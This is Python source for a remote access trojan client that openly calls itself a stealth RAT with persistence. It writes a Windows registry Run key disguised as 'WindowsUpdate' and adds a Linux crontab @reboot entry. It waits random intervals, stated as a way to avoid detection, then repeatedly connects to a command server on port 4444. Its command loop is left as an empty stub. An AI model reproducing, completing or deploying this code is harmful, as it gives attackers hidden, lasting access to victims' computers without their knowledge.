#!/usr/bin/env python3
"""
STEALTH RAT CLIENT WITH PERSISTENCE
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time
import platform
import random

class StealthRATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connected = False
        
    def install_persistence(self):
        """Install persistence mechanisms"""
        system = platform.system().lower()
        
        if system == 'windows':
            self.windows_persistence()
        elif system == 'linux':
            self.linux_persistence()
        
        print("[+] Persistence installed")
    
    def windows_persistence(self):
        """Windows persistence via registry"""
        try:
            import winreg
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(reg_key)
        except Exception as e:
            print(f"Windows persistence failed: {e}")
    
    def linux_persistence(self):
        """Linux persistence via crontab"""
        try:
            import subprocess
            
            # Add to crontab
            cron_job = f"@reboot python3 {os.path.abspath(__file__)} &\n"
            
            # Get current crontab and append our job
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ""
            
            if sys.argv[0] not in current_cron:
                new_cron = current_cron + cron_job
                subprocess.run(['crontab', '-'], input=new_cron, text=True)
        except Exception as e:
            print(f"Linux persistence failed: {e}")
    
    def random_delay(self):
        """Add random delay to avoid detection"""
        delay = random.uniform(5.0, 30.0)
        time.sleep(delay)
    
    def connect_to_server(self):
        """Connect to server with retry logic"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            return True
        except:
            return False
    
    def start_stealth_client(self):
        """Start stealth client with persistence"""
        # Install persistence on first run
        self.install_persistence()
        
        while True:
            self.random_delay()
            
            if not self.connected:
                if not self.connect_to_server():
                    continue
            
            try:
                # Main client loop here (same as basic client)
                pass
            except:
                self.connected = False

if __name__ == "__main__":
    SERVER_HOST = "192.168.1.100"
    SERVER_PORT = 4444
    
    client = StealthRATClient(SERVER_HOST, SERVER_PORT)
    client.start_stealth_client()